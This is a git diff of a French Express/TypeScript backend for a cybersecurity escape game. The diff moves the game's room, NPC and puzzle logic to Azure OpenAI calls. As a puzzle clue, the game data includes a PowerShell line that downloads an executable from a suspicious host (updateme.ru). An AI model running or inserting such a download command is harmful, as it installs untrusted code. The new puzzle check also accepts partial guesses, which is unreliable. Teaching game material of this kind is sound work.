@@ -1,6 +1,6 @@
-import { Request, Response } from "express";
-import { openAIService } from "./services/openai";
-import { ChatCompletionRequestMessage } from "@shared/schema";
+import { Request, Response } from 'express';
+import { Configuration, OpenAIApi } from 'openai';
+import axios from 'axios';
 
 /**
  * Interface pour la requête du jeu Cyber Escape
@@ -63,6 +63,12 @@ interface DecodeItemRequest {
   gameState: any;
 }
 
+interface PuzzleRequest {
+  puzzleId: string;
+  proposedSolution: string;
+  gameState: any;
+}
+
 /**
  * Gère l'entrée dans une nouvelle salle dans le jeu Cyber Escape
  */
@@ -99,91 +105,58 @@ Voici les informations sur l'état actuel du jeu:
 - Événements déjà déclenchés: ${updatedGameState.events.join(', ') || 'Aucun'}
 - Énigmes résolues: ${updatedGameState.puzzlesSolved.join(', ') || 'Aucune'}
 
-DESCRIPTION DE LA SALLE:
-`;
+Fournir une brève introduction de 3-5 phrases pour la salle dans laquelle le joueur vient d'entrer. Décris l'ambiance, l'environnement et ce que le joueur voit en premier.
 
-    // Ajout de la description spécifique selon la salle
-    switch (data.room.id) {
-      case 'hub':
-        systemPrompt += `Hub central de sécurité. C'est le point de départ de l'escape game. 
-La salle dispose de plusieurs portes menant vers d'autres zones (RH, IT, Support, Direction).
-Il y a une console centrale qui affiche l'état du réseau et un chronomètre indiquant le temps restant avant que le malware ne prenne contrôle total du système.
-Une alerte indique qu'un malware inconnu a pénétré le réseau et que les accès sont limités.`;
-        break;
-      case 'rh':
-        systemPrompt += `Service des Ressources Humaines. 
-Eddy y travaille comme Responsable RH et semble stressé.
-Il y a un ordinateur allumé avec un client mail ouvert.
-Des CVs sont disposés sur le bureau.
-Un document intitulé "Candidatures_2023.docm" est visible.`;
-        break;
-      case 'it':
-        systemPrompt += `Service Informatique. 
-Neil, le DSI, est en train de travailler frénétiquement sur son ordinateur.
-Il y a des écrans montrant des logs serveur.
-Un fichier "check_update.ps1" est ouvert dans un éditeur.
-Un panneau de contrôle du firewall est accessible.`;
-        break;
-      case 'support':
-        systemPrompt += `Centre de Support Technique. 
-Yousra, technicienne réseau, est présente mais semble peu concernée par la situation.
-Il y a une rangée d'ordinateurs, certains semblent isolés du réseau.
-Une clé USB est visible sur l'un des bureaux.
-Un tableau affiche des tickets d'incidents en cours.`;
-        break;
-      case 'direction':
-        systemPrompt += `Bureau de la Direction. 
-Guillaume, le Directeur Général, attend des explications sur la situation.
-Son ordinateur affiche un écran de ransomware.
-Un document confidentiel "Ordre_redemarrage_systemes.pdf" est sur son bureau.
-L'accès à la salle finale est verrouillé par un système de sécurité avancé.`;
-        break;
-      case 'salle-chiffree':
-        systemPrompt += `Salle de serveurs chiffrée. 
-Cette salle contient le cœur du système d'information.
-Plusieurs serveurs sont verrouillés par un ransomware.
-Un terminal central permet de saisir un code de récupération.
-C'est ici que le joueur peut mettre fin à l'attaque s'il a collecté tous les éléments nécessaires.`;
-        break;
-      default:
-        systemPrompt += `Une salle inconnue du complexe. Soyez sur vos gardes.`;
-    }
-
-    systemPrompt += `
-
-INSTRUCTIONS:
-1. Décris la salle de manière immersive en 3-5 phrases.
-2. Mentionne les éléments interactifs visibles (personnes, objets, écrans).
-3. Donne un indice subtil sur ce que le joueur doit chercher ou à qui parler.
-4. N'inclus AUCUNE instruction de jeu ou méta-information.
-
-Réponds au format JSON suivant sans aucun autre texte autour:
+Réponds uniquement avec un JSON au format:
 {
-  "description": "Description immersive de la salle",
-  "visibleElements": ["Élément 1", "Élément 2", ...],
-  "npcs": ["Nom du PNJ 1", "Nom du PNJ 2", ...],
-  "possibleActions": ["Action possible 1", "Action possible 2", ...],
-  "hint": "Un indice subtil pour aider le joueur"
+  "roomDescription": "Description de la salle (3-5 phrases)",
+  "availableActions": ["action1", "action2", "action3"],
+  "visibleItems": ["item1", "item2"]
 }`;
 
-    // Appel à OpenAI
-    const messages: ChatCompletionRequestMessage[] = [
-      { role: 'system', content: systemPrompt }
-    ];
-    
-    const response = await openAIService.getChatCompletion(messages);
-    
     try {
-      const parsedResponse = JSON.parse(response);
-      return res.json({
-        roomData: parsedResponse,
-        gameState: updatedGameState
-      });
-    } catch (parseError: unknown) {
-      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+      // Appel à l'API Azure OpenAI
+      const response = await axios.post(
+        `${process.env.AZURE_OPENAI_ENDPOINT}/openai/deployments/${process.env.AZURE_OPENAI_DEPLOYMENT}/chat/completions?api-version=${process.env.AZURE_OPENAI_API_VERSION}`,
+        {
+          messages: [
+            { 
+              role: "system", 
+              content: systemPrompt 
+            }
+          ],
+          temperature: 0.7,
+          max_tokens: 800
+        },
+        {
+          headers: {
+            'Content-Type': 'application/json',
+            'api-key': process.env.AZURE_OPENAI_KEY
+          }
+        }
+      );
+
+      const assistantResponse = response.data.choices[0].message.content;
+      
+      try {
+        const parsedResponse = JSON.parse(assistantResponse);
+        
+        return res.status(200).json({
+          response: parsedResponse,
+          gameState: updatedGameState
+        });
+      } catch (parseError: any) {
+        console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+        return res.status(500).json({ 
+          error: "Format de réponse invalide",
+          details: parseError?.message || "Erreur inconnue"
+        });
+      }
+    } catch (error: any) {
+      console.error("Erreur lors de l'appel à l'API OpenAI:", error);
       return res.status(500).json({ 
-        error: "Format de réponse invalide",
-        details: parseError instanceof Error ? parseError.message : "Erreur inconnue"
+        error: "Erreur lors de la génération de la description de la salle",
+        details: error.message
       });
     }
   } catch (error: any) {
@@ -208,173 +181,126 @@ export async function interactWithNPC(req: Request, res: Response) {
       });
     }
 
-    // Déterminer les caractéristiques du PNJ en fonction de son ID
-    let npcProfile = {
-      name: "",
-      role: "",
-      personality: "",
-      knowledge: "",
-      helpCondition: "",
-      secretToReveal: ""
+    // Mettre à jour le gameState si nécessaire
+    const updatedGameState = {
+      ...data.gameState
     };
 
-    switch (data.npcId) {
-      case 'eddy':
-        npcProfile = {
-          name: "Eddy",
-          role: "Responsable RH",
-          personality: "Stressé, peu technique, craintif",
-          knowledge: "A reçu un mail suspect avec une pièce jointe qui pourrait être l'origine de l'attaque",
-          helpCondition: "Être rassuré et ne pas être jugé pour avoir peut-être ouvert un fichier suspect",
-          secretToReveal: "Le mot de passe est caché dans les métadonnées du document Candidatures_2023.docm"
-        };
-        break;
-      case 'neil':
-        npcProfile = {
-          name: "Neil",
-          role: "DSI",
-          personality: "Technique, factuel, exigeant",
-          knowledge: "Peut examiner les logs et identifier l'IP malveillante, connaît l'accès au support",
-          helpCondition: "Recevoir une analyse pertinente ou l'identification correcte d'une connexion suspecte",
-          secretToReveal: "L'accès à la salle Support et l'identification d'une IP suspecte dans les logs"
-        };
-        break;
-      case 'yousra':
-        npcProfile = {
-          name: "Yousra",
-          role: "Technicienne Support",
-          personality: "Compétente mais paresseuse, motivée par les récompenses",
-          knowledge: "Possède une clé USB cryptée contenant des informations cruciales",
-          helpCondition: "Recevoir 150 crédits et un plan clair",
-          secretToReveal: "Une clé USB avec un fichier chiffré à décoder par ROT13 puis Base64"
-        };
-        break;
-      case 'guillaume':
-        npcProfile = {
-          name: "Guillaume",
-          role: "Directeur Général",
-          personality: "Autoritaire, orienté business, impatient",
-          knowledge: "Peut autoriser l'accès à la salle finale, connaît l'ordre de redémarrage des systèmes",
-          helpCondition: "Recevoir une explication claire et professionnelle de la situation",
-          secretToReveal: "L'ordre correct de redémarrage des systèmes est : Sauvegarde > ERP > Mail"
-        };
-        break;
-      case 'fares':
-        npcProfile = {
-          name: "Fares",
-          role: "Collègue suspect",
-          personality: "Trop serviable, évasif",
-          knowledge: "Est en réalité un imposteur qui tente de saboter les efforts du joueur",
-          helpCondition: "N/A - C'est un piège",
-          secretToReveal: "N/A - Toute interaction entraîne une perte de 300 crédits"
-        };
-        break;
-      default:
-        npcProfile = {
-          name: "Inconnu",
-          role: "Personnel non identifié",
-          personality: "Neutre, méfiant",
-          knowledge: "Informations limitées",
-          helpCondition: "Gagner sa confiance",
-          secretToReveal: "Aucune information particulière"
-        };
-    }
-    
     // Construction du prompt pour GPT
-    const systemPrompt = `Tu simules un PNJ nommé ${npcProfile.name} dans un jeu d'escape game cybersécurité "Cyber Escape - Le Pare-feu est tombé". Tu dois rester parfaitement dans le personnage sans jamais briser l'immersion.
+    const npcData = {
+      'eddy': {
+        name: 'Eddy',
+        role: 'Responsable RH',
+        traits: ['Stressé', 'Peu technique', 'Craintif']
+      },
+      'neil': {
+        name: 'Neil',
+        role: 'DSI',
+        traits: ['Technique', 'Factuel', 'Exigeant']
+      },
+      'yousra': {
+        name: 'Yousra',
+        role: 'Technicienne Support',
+        traits: ['Compétente', 'Paresseuse', 'Calculatrice']
+      },
+      'guillaume': {
+        name: 'Guillaume',
+        role: 'Directeur Général',
+        traits: ['Autoritaire', 'Impatient', 'Orienté business']
+      },
+      'fares': {
+        name: 'Farès',
+        role: 'Collègue suspect',
+        traits: ['Trop serviable', 'Évasif', 'Suspect']
+      }
+    };
 
-PROFIL DU PERSONNAGE:
-- Nom: ${npcProfile.name}
-- Rôle: ${npcProfile.role}
-- Personnalité: ${npcProfile.personality}
-- Connaissances: ${npcProfile.knowledge}
-- Condition d'aide: ${npcProfile.helpCondition}
-- Secret à révéler si conditions remplies: ${npcProfile.secretToReveal}
+    const npc = npcData[data.npcId as keyof typeof npcData];
+    
+    if (!npc) {
+      return res.status(400).json({ error: "PNJ non trouvé" });
+    }
 
-CONTEXTE DU JEU:
-- Un malware a pénétré le réseau de l'entreprise
-- Le joueur est un responsable cybersécurité qui doit résoudre la crise
-- Puzzles résolus: ${data.gameState.puzzlesSolved.join(', ') || 'Aucun'}
-- Inventaire du joueur: ${data.gameState.inventory.map((i: any) => i.name).join(', ') || 'Vide'}
-- Budget restant: ${data.gameState.budget} crédits
+    // Formater l'historique des conversations
+    const conversationHistoryText = data.conversationHistory.map(msg => 
+      `${msg.sender === 'player' ? 'Joueur' : msg.sender === 'npc' ? npc.name : 'Système'}: ${msg.content}`
+    ).join('\n');
 
-INSTRUCTIONS:
-1. Réponds comme le ferait ce personnage spécifique, avec son vocabulaire et ses tics de langage.
-2. Si le joueur pose les bonnes questions ou remplit tes conditions d'aide, révèle progressivement des indices.
-3. Si le joueur est trop direct ou agressif, réagis selon ta personnalité (stress, méfiance, etc.).
-4. N'invente pas d'informations qui ne sont pas dans ton profil.
-5. Si le PNJ est Fares, n'importe quelle interaction substantielle (sauf questions basiques) déclenche le piège.
+    let systemPrompt = `Tu es ${npc.name}, ${npc.role} dans un jeu d'escape room cybersécurité appelé "Cyber Escape - Le Pare-feu est tombé".
+Tu as les traits de personnalité suivants: ${npc.traits.join(', ')}.
 
-Réponds au format JSON suivant sans aucun autre texte autour:
+Contexte: Un malware a compromis le système de l'entreprise et contourné le pare-feu. Le joueur est le Responsable Sécurité qui doit résoudre cette crise.
+
+Voici l'historique de votre conversation:
+${conversationHistoryText}
+
+Le joueur vient de dire: "${data.userInput}"
+
+Réponds de manière cohérente avec ta personnalité. Fournir des indices ou des informations qui aideront le joueur à progresser dans sa mission, mais ne révèle pas tout d'un coup.
+
+Réponds uniquement avec un JSON au format:
 {
-  "dialogue": "La réponse du PNJ",
-  "attitude": "Attitude du PNJ (amical, méfiant, stressé, etc.)",
-  "revealedClue": "Indice révélé (vide si aucun)",
-  "triggerEvent": "Événement déclenché (vide si aucun)",
-  "revealedItem": "Objet révélé (vide si aucun)",
-  "costInCredits": 0
+  "dialogue": "Ta réponse en tant que personnage (1-3 phrases)",
+  "newInfo": true/false,
+  "revealedClue": "Indice révélé au joueur (s'il y a lieu)"
 }`;
 
-    // Conversion de l'historique des messages
-    const conversationContext: ChatCompletionRequestMessage[] = data.conversationHistory?.map(msg => {
-      const role = msg.sender === 'player' ? 'user' as const : 
-                 (msg.sender === 'npc' ? 'assistant' as const : 'system' as const);
-      return {
-        role,
-        content: msg.content
-      };
-    }) || [];
-
-    // Création du tableau de messages pour l'API
-    const messages: ChatCompletionRequestMessage[] = [
-      { role: 'system', content: systemPrompt },
-      ...conversationContext,
-      { role: 'user', content: data.userInput }
-    ];
-    
-    // Appel à OpenAI
-    const response = await openAIService.getChatCompletion(messages);
-    
     try {
-      const parsedResponse = JSON.parse(response);
-      
-      // Mise à jour de l'état du jeu
-      const updatedGameState = { ...data.gameState };
-      
-      // Si des crédits sont dépensés
-      if (parsedResponse.costInCredits && parsedResponse.costInCredits > 0) {
-        updatedGameState.budget -= parsedResponse.costInCredits;
-      }
-      
-      // Si un événement est déclenché
-      if (parsedResponse.triggerEvent && parsedResponse.triggerEvent !== "") {
-        updatedGameState.events = [...updatedGameState.events, parsedResponse.triggerEvent];
-      }
-      
-      // Si un objet est révélé
-      if (parsedResponse.revealedItem && parsedResponse.revealedItem !== "") {
-        const newItem = {
-          id: parsedResponse.revealedItem.toLowerCase().replace(/\s+/g, '-'),
-          name: parsedResponse.revealedItem,
-          type: 'clue',
-          discovered: true
-        };
-        
-        // Vérifier si l'objet n'est pas déjà dans l'inventaire
-        if (!updatedGameState.inventory.some((item: any) => item.id === newItem.id)) {
-          updatedGameState.inventory.push(newItem);
+      // Appel à l'API Azure OpenAI
+      const response = await axios.post(
+        `${process.env.AZURE_OPENAI_ENDPOINT}/openai/deployments/${process.env.AZURE_OPENAI_DEPLOYMENT}/chat/completions?api-version=${process.env.AZURE_OPENAI_API_VERSION}`,
+        {
+          messages: [
+            { 
+              role: "system", 
+              content: systemPrompt 
+            }
+          ],
+          temperature: 0.7,
+          max_tokens: 800
+        },
+        {
+          headers: {
+            'Content-Type': 'application/json',
+            'api-key': process.env.AZURE_OPENAI_KEY
+          }
         }
-      }
+      );
+
+      const assistantResponse = response.data.choices[0].message.content;
       
-      return res.json({
-        response: parsedResponse,
-        gameState: updatedGameState
-      });
-    } catch (parseError) {
-      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+      try {
+        const parsedResponse = JSON.parse(assistantResponse);
+        
+        // Si un nouvel indice est révélé, ajouter à l'inventaire
+        if (parsedResponse.newInfo && parsedResponse.revealedClue) {
+          const newItem = {
+            id: `clue-${Date.now()}`,
+            name: parsedResponse.revealedClue,
+            type: 'clue',
+            discovered: true
+          };
+          
+          updatedGameState.inventory.push(newItem);
+          updatedGameState.events.push(`Indice obtenu: ${parsedResponse.revealedClue}`);
+        }
+        
+        return res.status(200).json({
+          response: parsedResponse,
+          gameState: updatedGameState
+        });
+      } catch (parseError: any) {
+        console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+        return res.status(500).json({ 
+          error: "Format de réponse invalide",
+          details: parseError?.message || "Erreur inconnue"
+        });
+      }
+    } catch (error: any) {
+      console.error("Erreur lors de l'appel à l'API OpenAI:", error);
       return res.status(500).json({ 
-        error: "Format de réponse invalide",
-        details: parseError.message
+        error: "Erreur lors de la génération de la réponse du PNJ",
+        details: error.message
       });
     }
   } catch (error: any) {
@@ -408,123 +334,61 @@ Voici le contexte du jeu:
 - Énigmes résolues: ${data.gameState.puzzlesSolved.join(', ') || 'Aucune'}
 
 DESCRIPTION DE L'OBJET:
-`;
+Type: ${data.item.type}
+Nom: ${data.item.name}
 
-    // Déterminer les caractéristiques de l'objet
-    let itemIsDangerous = false;
-    let itemHasPassword = false;
-    let itemRequiresDecoding = false;
-    let password = "";
-    let itemUnlocksRoom = "";
+Génère une description détaillée de cet objet et comment il pourrait aider dans la résolution du jeu d'escape room.
 
-    switch (data.item.id) {
-      case 'candidatures-2023.docm':
-        systemPrompt += `Un document Word contenant des CV. Ce fichier est potentiellement dangereux s'il est ouvert directement, mais ses métadonnées contiennent un mot de passe utile.`;
-        itemIsDangerous = true;
-        itemHasPassword = true;
-        password = "P4ssw0rd";
-        break;
-      case 'logs-serveur':
-        systemPrompt += `Des logs de connexion au serveur. En les analysant attentivement, on peut repérer une connexion suspecte à 03:44 depuis l'IP 185.191.127.43.`;
-        itemHasPassword = true;
-        password = "127.43_03:44";
-        break;
-      case 'check-update.ps1':
-        systemPrompt += `Un script PowerShell contenant une ligne malveillante: Invoke-WebRequest -Uri "http://updateme.ru/agent.exe". Cette ligne doit être supprimée ou remplacée.`;
-        itemIsDangerous = true;
-        break;
-      case 'cle-usb':
-        systemPrompt += `Une clé USB contenant un fichier chiffré. Le contenu est d'abord encodé en ROT13 ("Vafgnapr vf zl anzr") puis en Base64 ("SW5jaWRlbnQgaW4gY29ycmVjdCBzZWN0aW9u").`;
-        itemRequiresDecoding = true;
-        itemHasPassword = true;
-        password = "InnocentCore";
-        break;
-      case 'ordre-redemarrage':
-        systemPrompt += `Un document détaillant l'ordre correct de redémarrage des systèmes critiques. L'ordre optimal est: Sauvegarde > ERP > Mail.`;
-        itemUnlocksRoom = "salle-chiffree";
-        break;
-      case 'terminal-final':
-        systemPrompt += `Un terminal nécessitant la combinaison de trois mots de passe découverts précédemment pour déverrouiller le système et stopper l'attaque.`;
-        break;
-      default:
-        systemPrompt += `Un objet qui pourrait contenir des informations utiles.`;
-    }
-
-    systemPrompt += `
-
-INSTRUCTIONS:
-1. Décris l'interaction avec l'objet de manière immersive en 2-3 phrases.
-2. Si l'objet est dangereux, indique subtilement un risque.
-3. Si l'objet contient un indice ou mot de passe, donne un indice sur comment le trouver.
-4. Si l'objet nécessite un décodage, suggère la méthode.
-5. Reste immersif, n'inclus aucune instruction de jeu directe.
-
-Réponds au format JSON suivant sans aucun autre texte autour:
+Réponds uniquement avec un JSON au format:
 {
-  "description": "Description de l'interaction avec l'objet",
-  "isDangerous": ${itemIsDangerous},
-  "containsPassword": ${itemHasPassword},
-  "requiresDecoding": ${itemRequiresDecoding},
-  "revealedPassword": "${itemHasPassword ? password : ''}",
-  "unlocksRoom": "${itemUnlocksRoom}",
-  "triggerEvent": "",
-  "hint": "Un indice sur comment utiliser ou comprendre l'objet"
+  "description": "Description détaillée de l'objet",
+  "useHint": "Indice sur la façon d'utiliser l'objet",
+  "relatedPuzzle": "Puzzle auquel cet objet pourrait être lié (si applicable)"
 }`;
 
-    // Appel à OpenAI
-    const messages: ChatCompletionRequestMessage[] = [
-      { role: 'system', content: systemPrompt }
-    ];
-    
-    const response = await openAIService.getChatCompletion(messages);
-    
     try {
-      const parsedResponse = JSON.parse(response);
+      // Appel à l'API Azure OpenAI
+      const response = await axios.post(
+        `${process.env.AZURE_OPENAI_ENDPOINT}/openai/deployments/${process.env.AZURE_OPENAI_DEPLOYMENT}/chat/completions?api-version=${process.env.AZURE_OPENAI_API_VERSION}`,
+        {
+          messages: [
+            { 
+              role: "system", 
+              content: systemPrompt 
+            }
+          ],
+          temperature: 0.7,
+          max_tokens: 800
+        },
+        {
+          headers: {
+            'Content-Type': 'application/json',
+            'api-key': process.env.AZURE_OPENAI_KEY
+          }
+        }
+      );
+
+      const assistantResponse = response.data.choices[0].message.content;
       
-      // Mise à jour de l'état du jeu
-      const updatedGameState = { ...data.gameState };
-      
-      // Si un mot de passe est révélé
-      if (parsedResponse.revealedPassword && parsedResponse.revealedPassword !== "") {
-        const newItem = {
-          id: `password-${parsedResponse.revealedPassword.toLowerCase().replace(/\s+/g, '-')}`,
-          name: `Mot de passe: ${parsedResponse.revealedPassword}`,
-          type: 'password',
-          discovered: true
-        };
+      try {
+        const parsedResponse = JSON.parse(assistantResponse);
         
-        // Vérifier si le mot de passe n'est pas déjà dans l'inventaire
-        if (!updatedGameState.inventory.some((item: any) => item.id === newItem.id)) {
-          updatedGameState.inventory.push(newItem);
-        }
+        return res.status(200).json({
+          response: parsedResponse,
+          gameState: data.gameState
+        });
+      } catch (parseError: any) {
+        console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+        return res.status(500).json({ 
+          error: "Format de réponse invalide",
+          details: parseError?.message || "Erreur inconnue"
+        });
       }
-      
-      // Si une salle est déverrouillée
-      if (parsedResponse.unlocksRoom && parsedResponse.unlocksRoom !== "") {
-        if (!updatedGameState.unlockedRooms.includes(parsedResponse.unlocksRoom)) {
-          updatedGameState.unlockedRooms.push(parsedResponse.unlocksRoom);
-        }
-      }
-      
-      // Si un événement est déclenché
-      if (parsedResponse.triggerEvent && parsedResponse.triggerEvent !== "") {
-        updatedGameState.events.push(parsedResponse.triggerEvent);
-        
-        // Si l'événement est dangereux, réduire le temps
-        if (parsedResponse.isDangerous && parsedResponse.triggerEvent.includes("malware")) {
-          updatedGameState.timeRemaining = Math.max(0, updatedGameState.timeRemaining - 5);
-        }
-      }
-      
-      return res.json({
-        response: parsedResponse,
-        gameState: updatedGameState
-      });
-    } catch (parseError) {
-      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+    } catch (error: any) {
+      console.error("Erreur lors de l'appel à l'API OpenAI:", error);
       return res.status(500).json({ 
-        error: "Format de réponse invalide",
-        details: parseError.message
+        error: "Erreur lors de la génération de la description de l'objet",
+        details: error.message
       });
     }
   } catch (error: any) {
@@ -541,119 +405,159 @@ Réponds au format JSON suivant sans aucun autre texte autour:
  */
 export async function solvePuzzle(req: Request, res: Response) {
   try {
-    const { puzzleId, proposedSolution, gameState } = req.body;
+    const data: PuzzleRequest = req.body;
 
-    if (!puzzleId || !proposedSolution || !gameState) {
+    if (!data.puzzleId || !data.proposedSolution || !data.gameState) {
       return res.status(400).json({ 
         error: "Données manquantes pour la résolution du puzzle" 
       });
     }
 
-    // Vérifier la solution en fonction de l'ID du puzzle
-    let isCorrect = false;
-    let reward = null;
-    let unlockRoom = null;
-    let feedback = "";
+    // Définir les puzzles et leurs solutions
+    const puzzles: Record<string, {
+      title: string;
+      description: string;
+      solution: string;
+      difficulty: number; // 1-5
+    }> = {
+      'ip-suspecte': {
+        title: "Analyse d'IP suspecte",
+        description: "Identifiez l'adresse IP qui a accédé à des sections sensibles du système",
+        solution: "185.191.127.43",
+        difficulty: 2
+      },
+      'script-powershell': {
+        title: "Correction du script PowerShell",
+        description: "Identifiez et corrigez la ligne malveillante dans le script PowerShell",
+        solution: "Invoke-WebRequest -Uri \"http://updateme.ru/agent.exe\"",
+        difficulty: 3
+      },
+      'decode-usb': {
+        title: "Fichier USB crypté",
+        description: "Décodez le message caché dans le fichier USB",
+        solution: "instance",
+        difficulty: 4
+      },
+      'ordre-redemarrage': {
+        title: "Plan de redémarrage des systèmes",
+        description: "Déterminez le bon ordre pour redémarrer les systèmes critiques",
+        solution: "firewall,authentication,database,application",
+        difficulty: 3
+      },
+      'mot-passe-final': {
+        title: "Mot de passe du terminal principal",
+        description: "Trouvez le mot de passe pour accéder au terminal principal",
+        solution: "CyB3rP4r3F3u2025!",
+        difficulty: 5
+      }
+    };
 
-    switch (puzzleId) {
-      case 'ip-suspecte':
-        isCorrect = proposedSolution.includes('185.191.127.43');
-        reward = { 
-          id: 'acces-logs',
-          name: 'Accès aux logs complets',
-          type: 'tool'
-        };
-        feedback = isCorrect 
-          ? "Excellente analyse ! Cette IP n'appartient pas à notre plage réseau habituelle."
-          : "Cette IP ne semble pas être la source du problème. Regardez attentivement les connexions nocturnes.";
-        break;
-      case 'script-powershell':
-        isCorrect = !proposedSolution.includes('updateme.ru');
-        reward = {
-          id: 'script-secure',
-          name: 'Script sécurisé',
-          type: 'tool'
-        };
-        feedback = isCorrect 
-          ? "Vous avez neutralisé le code malveillant qui téléchargeait un exécutable non autorisé."
-          : "Le script contient toujours du code qui tente de télécharger un fichier depuis un domaine suspect.";
-        break;
-      case 'decode-usb':
-        // Le mot est "InnocentCore" après décodage
-        isCorrect = proposedSolution.toLowerCase() === 'innocentcore';
-        reward = {
-          id: 'cle-dechiffrement',
-          name: 'Clé de déchiffrement',
-          type: 'password'
-        };
-        feedback = isCorrect 
-          ? "Décodage réussi ! Vous avez extrait la clé de déchiffrement des données."
-          : "Le résultat du décodage n'est pas correct. Essayez d'appliquer ROT13 puis Base64.";
-        break;
-      case 'ordre-redemarrage':
-        isCorrect = proposedSolution.toLowerCase().includes('sauvegarde') && 
-                   proposedSolution.toLowerCase().includes('erp') && 
-                   proposedSolution.toLowerCase().includes('mail') &&
-                   proposedSolution.indexOf('sauvegarde') < proposedSolution.indexOf('erp') &&
-                   proposedSolution.indexOf('erp') < proposedSolution.indexOf('mail');
-        unlockRoom = 'salle-chiffree';
-        feedback = isCorrect 
-          ? "Stratégie optimale ! Cette séquence de redémarrage préserve l'intégrité des données tout en restaurant les services critiques."
-          : "Cet ordre de redémarrage pourrait entraîner des pertes de données ou compromettre la sécurité.";
-        break;
-      case 'mot-passe-final':
-        // Combinaison des 3 mots de passe
-        const passwords = ['P4ssw0rd', '127.43_03:44', 'InnocentCore'];
-        isCorrect = passwords.every(pw => proposedSolution.includes(pw));
-        reward = {
-          id: 'acces-final',
-          name: 'Accès administrateur système',
-          type: 'tool'
-        };
-        feedback = isCorrect 
-          ? "Authentification administrateur validée ! Vous avez maintenant le contrôle complet du système."
-          : "Authentification échouée. Assurez-vous d'avoir collecté et combiné tous les mots de passe nécessaires.";
-        break;
-      default:
-        feedback = "Ce puzzle n'est pas reconnu par le système.";
+    const puzzle = puzzles[data.puzzleId];
+    
+    if (!puzzle) {
+      return res.status(400).json({ error: "Puzzle non trouvé" });
     }
 
-    // Mise à jour de l'état du jeu
-    const updatedGameState = { ...gameState };
+    // Vérifier si la solution est correcte (avec une certaine tolérance)
+    const normalizedSolution = data.proposedSolution.trim().toLowerCase();
+    const normalizedCorrectSolution = puzzle.solution.trim().toLowerCase();
     
-    if (isCorrect) {
-      // Ajouter le puzzle résolu
-      if (!updatedGameState.puzzlesSolved.includes(puzzleId)) {
-        updatedGameState.puzzlesSolved.push(puzzleId);
+    // La solution est considérée comme correcte si elle contient la solution attendue
+    const isCorrect = normalizedSolution.includes(normalizedCorrectSolution) || 
+                      normalizedCorrectSolution.includes(normalizedSolution);
+
+    // Mettre à jour le gameState
+    const updatedGameState = {
+      ...data.gameState
+    };
+
+    if (isCorrect && !updatedGameState.puzzlesSolved.includes(data.puzzleId)) {
+      // Ajouter le puzzle aux puzzles résolus
+      updatedGameState.puzzlesSolved.push(data.puzzleId);
+      
+      // Attribuer une récompense en fonction de la difficulté
+      const reward = puzzle.difficulty * 50; // 50 à 250 crédits selon la difficulté
+      updatedGameState.budget += reward;
+      
+      // Ajouter à l'historique des événements
+      updatedGameState.events.push(`Puzzle "${puzzle.title}" résolu! +${reward} crédits`);
+      
+      // Déverrouiller des salles selon le puzzle résolu
+      if (data.puzzleId === 'ip-suspecte' && !updatedGameState.unlockedRooms.includes('support')) {
+        updatedGameState.unlockedRooms.push('support');
+        updatedGameState.events.push('Nouvelle salle déverrouillée: Support technique');
       }
       
-      // Ajouter la récompense à l'inventaire
-      if (reward) {
-        const newItem = {
-          ...reward,
-          discovered: true
-        };
-        
-        if (!updatedGameState.inventory.some((item: any) => item.id === newItem.id)) {
-          updatedGameState.inventory.push(newItem);
+      if (data.puzzleId === 'script-powershell' && !updatedGameState.unlockedRooms.includes('direction')) {
+        updatedGameState.unlockedRooms.push('direction');
+        updatedGameState.events.push('Nouvelle salle déverrouillée: Bureau Direction');
+      }
+      
+      if (data.puzzleId === 'decode-usb' && !updatedGameState.unlockedRooms.includes('salle-chiffree')) {
+        updatedGameState.unlockedRooms.push('salle-chiffree');
+        updatedGameState.events.push('Nouvelle salle déverrouillée: Salle sécurisée');
+      }
+    }
+
+    // Construire le message de feedback basé sur le résultat
+    const feedbackPrompt = `
+Tu es le narrateur d'un jeu d'escape room cybersécurité. Le joueur a tenté de résoudre le puzzle "${puzzle.title}".
+Sa proposition: "${data.proposedSolution}"
+Solution correcte: "${puzzle.solution}"
+Résultat: ${isCorrect ? 'CORRECT' : 'INCORRECT'}
+
+Génère un message de feedback encourageant qui:
+${isCorrect ? 
+  "- Félicite le joueur pour sa solution correcte\n- Explique pourquoi c'était la bonne solution\n- Donne un indice pour la suite du jeu" : 
+  "- Encourage le joueur à réessayer\n- Donne un indice subtil sans révéler la solution\n- Suggère une approche alternative"}
+
+Le feedback doit être concis (2-3 phrases).`;
+
+    try {
+      // Appel à l'API Azure OpenAI pour le feedback
+      const response = await axios.post(
+        `${process.env.AZURE_OPENAI_ENDPOINT}/openai/deployments/${process.env.AZURE_OPENAI_DEPLOYMENT}/chat/completions?api-version=${process.env.AZURE_OPENAI_API_VERSION}`,
+        {
+          messages: [
+            { 
+              role: "system", 
+              content: feedbackPrompt 
+            }
+          ],
+          temperature: 0.7,
+          max_tokens: 200
+        },
+        {
+          headers: {
+            'Content-Type': 'application/json',
+            'api-key': process.env.AZURE_OPENAI_KEY
+          }
         }
-      }
+      );
+
+      const feedback = response.data.choices[0].message.content.trim();
       
-      // Déverrouiller une salle si nécessaire
-      if (unlockRoom && !updatedGameState.unlockedRooms.includes(unlockRoom)) {
-        updatedGameState.unlockedRooms.push(unlockRoom);
-      }
+      return res.status(200).json({
+        isCorrect,
+        feedback,
+        gameState: updatedGameState
+      });
+    } catch (error: any) {
+      console.error("Erreur lors de l'appel à l'API OpenAI pour le feedback:", error);
+      return res.status(500).json({ 
+        error: "Erreur lors de la génération du feedback",
+        details: error.message,
+        isCorrect,
+        feedback: isCorrect ? 
+          "Félicitations! Votre solution est correcte." : 
+          "Votre solution n'est pas correcte. Essayez une approche différente.",
+        gameState: updatedGameState
+      });
     }
-    
-    return res.json({
-      isCorrect,
-      feedback,
-      gameState: updatedGameState
-    });
   } catch (error: any) {
     console.error("Erreur dans solvePuzzle:", error);
     return res.status(500).json({ 
-      error: "Erreur lors de la vérification de la solution",
+      error: "Erreur lors de la résolution du puzzle",
       details: error.message
     });
   }
@@ -672,55 +576,74 @@ export async function generatePlayerProfile(req: Request, res: Response) {
       });
     }
 
-    // Construction du prompt pour GPT
-    const systemPrompt = `Tu es un expert en cybersécurité qui évalue le comportement d'un joueur dans un escape game cyber. Rédige une fiche profil à partir de ses décisions.
+    // Construction du prompt pour l'analyse du profil
